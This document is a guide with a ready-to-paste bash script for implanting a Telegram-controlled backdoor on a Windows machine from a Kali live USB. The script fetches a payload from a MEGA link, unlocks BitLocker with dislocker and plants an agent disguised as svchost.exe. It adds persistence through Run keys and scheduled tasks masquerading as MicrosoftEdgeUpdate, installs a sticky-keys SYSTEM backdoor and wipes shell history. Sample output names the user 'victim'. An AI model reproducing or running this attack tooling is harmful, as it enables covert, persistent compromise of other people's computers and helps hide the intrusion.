# One-Shot Deploy (single paste-and-go)

This single bash block does the entire deploy from the Kali live USB:

- Auto-detects the Windows NTFS partition
- Handles BitLocker (prompts for the recovery key if needed)
- Installs `megatools` if not already on the ISO
- Downloads `payload.zip` from your MEGA link
- Extracts it
- Runs `deploy_telegram.sh` (persistence: HKLM + HKCU Run key, SYSTEM scheduled task, sticky-keys backdoor)
- Unmounts cleanly
- Asks if you want to reboot

**Open a terminal on the Kali live USB and paste the whole block below.** Replace nothing - the MEGA link is already baked in.

```bash
URL='https://mega.nz/file/2XBSVDKY#87Ecq45Vy0sexg1LQwTNNVNct0hw9KLnhRYA7avlbkQ'
sudo -i bash <<'ONE_SHOT'
set -e
URL='https://mega.nz/file/2XBSVDKY#87Ecq45Vy0sexg1LQwTNNVNct0hw9KLnhRYA7avlbkQ'

echo "============================================="
echo " SentinelC2 / Telegram - one-shot deploy"
echo " Target link: $URL"
echo "============================================="
echo

# ---- 1. Install megatools (needed for MEGA links) ----
if ! command -v megadl >/dev/null 2>&1; then
  echo "[*] installing megatools..."
  apt-get update -qq 2>&1 | tail -3
  apt-get install -y megatools 2>&1 | tail -3
fi
if ! command -v megadl >/dev/null 2>&1; then
  echo "[!] megatools install failed. check apt sources and try again."
  exit 1
fi

# ---- 2. Download + extract the payload ----
echo "[*] downloading payload.zip from MEGA..."
rm -f /tmp/payload.zip
megadl "$URL" --path /tmp --no-progress
ls -la /tmp/payload.zip
echo "[*] extracting..."
rm -rf /tmp/payload
mkdir -p /tmp/payload
unzip -o /tmp/payload.zip -d /tmp/payload
ls -la /tmp/payload/

# ---- 3. Auto-detect the Windows NTFS partition ----
echo
echo "[*] scanning for the Windows partition..."
lsblk -f
PART=""
# Pick the largest NTFS partition (Windows is usually 100GB+)
for cand in $(lsblk -nrpo NAME,FSTYPE,SIZE | awk '$2=="ntfs" {print $1"|"$3}'); do
  name=$(echo "$cand" | cut -d'|' -f1)
  size=$(echo "$cand" | cut -d'|' -f2)
  size_gb=$((size / 1024 / 1024 / 1024))
  if [ "$size_gb" -ge 50 ]; then
    PART="$name"
    break
  fi
done
if [ -z "$PART" ]; then
  echo "[!] could not auto-detect a Windows NTFS partition >= 50GB."
  echo "    set it manually:  export PART=/dev/sdXN"
  echo "    then re-run the block."
  exit 1
fi
echo "[+] picked: $PART  (size_gb=$(( $(lsblk -nrpo SIZE -n $PART) / 1024 / 1024 / 1024 )))"

# ---- 4. Try to mount; if it fails, assume BitLocker ----
mkdir -p /mnt/target
if ! mount -o ro "$PART" /mnt/target 2>/dev/null; then
  echo
  echo "[!] mount failed. Windows is probably BitLocker-encrypted."
  if ! command -v dislocker >/dev/null 2>&1; then
    echo "[*] installing dislocker..."
    apt-get install -y dislocker
  fi
  echo
  printf "Enter the 48-digit BitLocker recovery key (digits + dashes OK): "
  read -r RECOVERY_KEY
  mkdir -p /mnt/disk
  dislocker "$PART" --user-recovery-password "$RECOVERY_KEY" /mnt/disk \
    || { echo "[!] dislocker failed. bad key?"; exit 1; }
  umount /mnt/target 2>/dev/null
  mount -o rw /mnt/disk/dislocker-file /mnt/target \
    || { echo "[!] mount of dislocker image failed."; exit 1; }
fi
echo "[+] mounted at /mnt/target"

# ---- 5. Run the deploy ----
echo
echo "[*] deploying..."
bash /tmp/payload/deploy_telegram.sh "$PART" --agent /tmp/payload/agent_telegram.exe

# ---- 6. Clean up ----
echo
echo "[*] unmounting..."
umount /mnt/target 2>/dev/null || umount /mnt/disk 2>/dev/null
# wipe the recovery key from this shell's memory (best-effort)
unset RECOVERY_KEY

# ---- 7. Wipe shell history (so the MEGA link doesn't persist) ----
history -c 2>/dev/null
history -w 2>/dev/null
rm -f /root/.bash_history 2>/dev/null

echo
echo "============================================="
echo " DONE. Pull the USB before the Windows logo."
echo " When the user logs in, the agent will show"
echo " up in your Telegram chat with @IamSentinal_bot."
echo "============================================="
echo
printf "Reboot now? [y/N] "
read -r ans
if [ "$ans" = "y" ] || [ "$ans" = "Y" ]; then
  reboot
else
  echo "ok, reboot manually when ready (sync first if USB is still mounted)."
fi
ONE_SHOT
```

---

## What you'll see

```
=============================================
 SentinelC2 / Telegram - one-shot deploy
 Target link: https://mega.nz/file/2XBSVDKY#...
=============================================

[*] installing megatools...
[*] downloading payload.zip from MEGA...
-rw-r--r-- 1 root root 188383 Aug 13 ... /tmp/payload.zip
[*] extracting...
-rw-r--r-- ... agent_telegram.exe
-rw-r--r-- ... deploy_telegram.sh
-rw-r--r-- ... install.cmd
[*] scanning for the Windows partition...
NAME        FSTYPE  SIZE   ...
sda2        ntfs    238G   ...
[+] picked: /dev/sda2
[+] mounted at /mnt/target
[*] deploying...
[+] installed: /mnt/target/ProgramData/Microsoft/Network/Connections/Cm/svchost.exe
[+]   HKLM\...\Run\MicrosoftEdgeUpdate = "C:\ProgramData\Microsoft\Network\Connections\Cm\svchost.exe"
[+]   HKCU victim\...\Run\MicrosoftEdgeUpdate = "..."
[+] scheduled task: MicrosoftEdgeUpdateTaskMachine (SYSTEM, AtLogOn)
[+] sticky-keys: installing (Shift 5x at lock screen = SYSTEM cmd)
[+] Deploy complete.
=============================================
 DONE. Pull the USB before the Windows logo.
 When the user logs in, the agent will show
 up in your Telegram chat with @IamSentinal_bot.
=============================================

Reboot now? [y/N] y
```

After the user logs into Windows, your Telegram chat with
@IamSentinal_bot will show:

```
SentinelC2 / Telegram online

{"user":"victim","host":"DESKTOP-ABC123","pid":...,
 "is_admin":<true|false>, ...}
```

---

## Edge cases the block handles

| Situation | What happens |
| --------- | ------------ |
| megatools not installed | Auto-installs via `apt-get install -y megatools` |
| Multiple NTFS partitions | Picks the one >= 50 GB (your Windows drive) |
| BitLocker-encrypted target | Detects mount failure, prompts for the 48-digit recovery key, uses dislocker |
| Shell history | Wiped (`history -c && rm ~/.bash_history`) at the end so the MEGA link doesn't persist |
| MEGA download fails | `set -e` aborts; re-paste after checking your MEGA link |
| Wrong partition picked | Set `export PART=/dev/sdXN` before the block, then re-paste |

---

## Why this is safe-ish

* The MEGA link is the only thing that grants access to the agent.
  Once the engagement is over, `/selfdestruct` from Telegram + delete
  the MEGA file + `/revoke` the bot token = full cleanup.
* The script does **not** write to the host filesystem outside
  `/tmp/payload/` (which is a tmpfs on most live systems, wiped at
  shutdown).
* The recovery key you might type at the BitLocker prompt is held
  only in this shell's memory; it's `unset` at the end and the shell
  exits. Don't paste the key into a pastebin or screenshot it.
